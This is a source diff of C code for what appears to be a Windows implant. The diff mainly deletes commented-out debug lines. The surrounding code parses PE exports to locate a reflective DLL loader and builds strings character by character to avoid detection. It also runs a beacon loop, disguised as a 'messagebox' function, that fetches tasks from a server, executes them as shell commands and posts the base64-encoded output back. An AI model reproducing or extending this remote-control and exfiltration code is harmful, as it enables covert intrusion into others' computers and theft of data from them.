@@ -640,7 +640,6 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
 
     UINT_PTR uiNtHeaders;
     UINT_PTR uiExportDirectoryData;
-    //UINT_PTR uiExportDirectory;
 
     uiNtHeaders = uiDll + ((PIMAGE_DOS_HEADER)uiDll)->e_lfanew;
     #ifdef DEBUG
@@ -650,8 +649,6 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
 
     uiExportDirectoryData = (UINT_PTR) &((PIMAGE_NT_HEADERS64)uiNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
-    //ExportDirectoryData = OptionalHeaders.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    //ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiDll + Rva2Offset(ExportDirectoryData.VirtualAddress, uiDll));
     UINT_PTR uiExportDirectory = uiDll + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->VirtualAddress, uiDll);
     #ifdef DEBUG
     WCHAR pExportDir[] = { 'e', 'x', 'p', 'o', 'r', 't', 'd', 'i', 'r', ':', ' ', '%', 'p', '\n', 0 };
@@ -671,27 +668,6 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
     UINT_PTR nameRva;
     UINT_PTR nameAdr;
     UINT_PTR rlAddress;
-
-    /*
-    CHAR nameRvaFormat[] = { 'n', 'a', 'm', 'e', 'R', 'v', 'a', ':', '%', 'p', '\n', 0 };
-    ((PRINTF)api->printf)(nameRvaFormat, ExportDirectory->Base);
-    */
-
-    /*
-    nameAdr = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->Name, uiDll);
-    WCHAR nameAdrFormat[] = { 'n', 'a', 'm', 'e', 'A', 'd', 'r', ':', '%', 'p', '\n', 0 };
-    ((WPRINTF)api->wprintf)(nameAdrFormat, nameAdr);
-    ((PRINTF)api->printf)((CHAR*)(uiDll + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->Name, uiDll)));
-    */
-
-    /*
-    functionNameAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNames,uiDll);
-    CHAR nameAddresses[] = { 'n', 'a', 'm', 'e', 'A', 'd', 'r', ':', ' ', '%', 'p', '\n', 0 };
-    ((PRINTF)api->printf)(nameAddresses, functionNameAddresses);
-    */
-
-    //((PRINTF)api->printf)((CHAR*)functionNameAddresses);
-
 
     dwNumberOfEntries = ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->NumberOfNames;
     #ifdef DEBUG
@@ -745,26 +721,6 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
             break;
         }
     }
-
-    /*
-    while(dwNumberOfEntries--) {
-        if (my_strcmp(, (char*)rlName) != 0)
-        {
-            functionNameAddresses += sizeof(DWORD); // 32 bit pointers
-            functionOrdinals += sizeof(WORD);       // Ordinal values or 16 bit
-            continue;
-        }
-
-        // Get the index from the ordinal table, multiply by the size
-        // of how big one address in the function address table is.
-        // This will give us the number to add to the pointer to
-        // `functionAddresses` to get the offset to the RL.
-        // Remember, this offset is from the reflective DLL's current
-        // address. It will be used to pass to CreateThread as it's
-        // fourth parameter (thread s tarting point) //
-        functionAddresses += DEREF_16(functionOrdinals)*sizeof(DWORD);
-    }
-    */
 
     return rlAddress;
 }
@@ -917,20 +873,6 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid) {
     myStrtok(NULL, NULL, TRUE);
     return task;
 }
-
-/*
-VOID escapeBackslashes(CCHAR *input, CHAR *output) {
-    int j = 0; // Index for output
-    for (int i = 0; input[i] != '\0'; i++) {
-        if (input[i] == '\\') {
-            output[j++] = '\\'; // Add an extra backslash
-        }
-        output[j] = input[i]; // Copy the current character
-        j++;
-    }
-    output[j] = '\0'; // Null-terminate the output string
-}
-*/
 
 void messagebox() {
     API Api = { 0 };
@@ -1088,24 +1030,9 @@ void messagebox() {
             ((SLEEP)api->Sleep)(3000);
             continue;
         }
-        /*
-        ((PRINTF)api->printf)("check");
-        ((PRINTF)api->printf)("%s", jsonResponse);
-        ((PRINTF)api->printf)("%p", api);
-        if (jsonResponse==NULL)
-        { ((PRINTF)api->printf)("jsonResponse"); }
-        if (api==NULL)
-        { ((PRINTF)api->printf)("api"); }
-        if (taskId==NULL)
-        { ((PRINTF)api->printf)("taskId"); }
-        if (agentUuid==NULL)
-        { ((PRINTF)api->printf)("agentUuid"); }
-        */
 
         task = readJsonTask(api, jsonResponse, &taskId, &agentUuid);
         ((PRINTF)api->printf)("%s", task);
-        //((PRINTF)api->printf)("%s", readJsonTask(api, jsonResponse, &taskId, &agentUuid));
-        //task = "dir";
         taskOutput = myTrimB(api, ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
 
         ((PRINTF)api->printf)("%s", taskOutput);
@@ -1113,21 +1040,12 @@ void messagebox() {
         b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
 
-        /*
-        ((PRINTF)api->printf)("\nb63EncodedOutputSize: %d\n", b64EncodedOutputSize);
-        ((PRINTF)api->printf)("\njsonFormatSize: %d\n", myStrlenA(jsonFormat));
-        ((PRINTF)api->printf)("\ntaskIdSize: %d\n", myStrlenA(taskId));
-        ((PRINTF)api->printf)("\nagentUuidSize: %d\n", myStrlenA(agentUuid));
-        */
-
         totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid);
         ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
-        //fullPath2 = myConcatW(api, sendOutputPath, uuid);
         WCHAR fullPath2[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/','1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0};
         PostRequest(api, wServer, port, fullPath2, json);
-        //((PRINTF)api->printf)(json);
 
         if (taskOutput) {
             ((FREE)api->free)(taskOutput);
@@ -1138,43 +1056,6 @@ void messagebox() {
         if (json) {
             ((FREE)api->free)(json);
         }
-
-        /*
-        // Calculate the size of b64 encoded output
-        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
-        b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
-        ((PRINTF)api->printf)("%s", b64EncodedOutput);
-        // Then fire it
-        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
-
-        //escapeBackslashes(taskOutput, escapedTaskOutput);
-
-        totalJsonSize = myStrlenA(jsonFormat)+1 + b64EncodedOutputSize+1 + myStrlenA(taskId)+1 + myStrlenA(agentUuid)+1;
-        json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
-
-        //((SNPRINTF)api->snprintf)(json, totalJsonSize*sizeof(CHAR), jsonFormat, taskId, agentUuid, b64EncodedOutput);
-        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
-
-        PostRequest(api, wServer, port, myConcat(api, sendOutputPath, uuid), json);
-
-        ((PRINTF)api->printf)("1");
-        if (taskOutput) {
-            ((FREE)api->free)(taskOutput);
-        }
-        ((PRINTF)api->printf)("2");
-        if (b64EncodedOutput) {
-            ((FREE)api->free)(b64EncodedOutput);
-        }
-        ((PRINTF)api->printf)("3");
-        if (json) {
-            ((FREE)api->free)(json);
-        }
-        ((PRINTF)api->printf)("4");
-        if (jsonResponse) {
-            ((FREE)api->free)(jsonResponse);
-        }
-        ((PRINTF)api->printf)("5");
-        */
 
         ((SLEEP)api->Sleep)(3000);
         ((PRINTF)api->printf)("asdf");
